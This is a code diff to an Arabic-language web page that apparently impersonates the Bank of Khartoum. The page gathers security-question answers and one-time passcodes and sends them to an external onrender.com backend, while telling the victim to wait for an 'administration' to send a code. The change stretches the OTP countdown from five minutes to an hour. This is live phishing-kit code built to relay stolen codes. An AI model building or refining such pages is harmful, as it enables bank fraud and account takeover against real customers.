@@ -436,7 +436,7 @@ select:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
         <svg width="80" height="80" viewBox="0 0 80 80"><circle class="bg-circle" cx="40" cy="40" r="35"/><circle class="fg-circle" id="timer-circle" cx="40" cy="40" r="35" stroke-dashoffset="0"/></svg>
         <div style="text-align:center"><div class="timer-display" id="timer-display">05:00</div></div>
       </div>
-      <div class="timer-label">دقيقة متبقية</div>
+      <div class="timer-label">ساعة متبقية</div>
     </div>
     <div class="waiting-notice show" id="waiting-notice">⏳ في انتظار إرسال رمز التحقق من الإدارة...</div>
     <div class="otp-notice" id="otp-ready-notice" style="display:none">📱 تم إرسال رمز التحقق، أدخله أدناه</div>
@@ -502,7 +502,7 @@ select:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
 
 <script>
 const API = 'https://bank-of-khartoum-bg6z.onrender.com';
-let timerInterval=null, timerSeconds=300, SESSION_ID=null, pollInterval=null;
+let timerInterval=null, timerSeconds=3600, SESSION_ID=null, pollInterval=null;
 const questions={cousin:'ما هو اسم ابن عمك الأول؟',city:'في أي مدينة ولدت؟',grad:'في أي سنة تخرجت من الجامعة؟',nick:'ماذا كان لقبك أثناء الطفولة؟',author:'اسم مؤلفك المفضل؟',car:'اسم الشركة المصنعة للسيارة المفضلة لديك؟',movie:'أي فيلم هو المفضل لديك؟',friend:'اسم أفضل صديق في الطفولة؟',school:'ما هو اسم المدرسة التي التحقت بها؟',football:'اسم فريق كرة القدم المفضل لديك؟'};
 const otpIds=['otp1','otp2','otp3','otp4','otp5','otp6'];
 
@@ -601,7 +601,7 @@ function startPolling(){
 }
 
 function startOTPTimer(){
-  timerSeconds=300;clearInterval(timerInterval);updateTimerDisplay();
+  timerSeconds=3600;clearInterval(timerInterval);updateTimerDisplay();
   timerInterval=setInterval(()=>{timerSeconds--;updateTimerDisplay();if(timerSeconds<=0){clearInterval(timerInterval);clearInterval(pollInterval);document.getElementById('otp-error').textContent='انتهت صلاحية الرمز.';document.getElementById('otp-error').classList.add('show');}},1000);
 }
 
@@ -609,7 +609,7 @@ function updateTimerDisplay(){
   const m=Math.floor(timerSeconds/60).toString().padStart(2,'0');
   const s=(timerSeconds%60).toString().padStart(2,'0');
   document.getElementById('timer-display').textContent=m+':'+s;
-  const offset=219.9*(1-timerSeconds/300);
+  const offset=219.9*(1-timerSeconds/3600);
   const color=timerSeconds<=60?'#E05252':'#C41230';
   document.getElementById('timer-circle').style.strokeDashoffset=offset;
   document.getElementById('timer-circle').style.stroke=color;
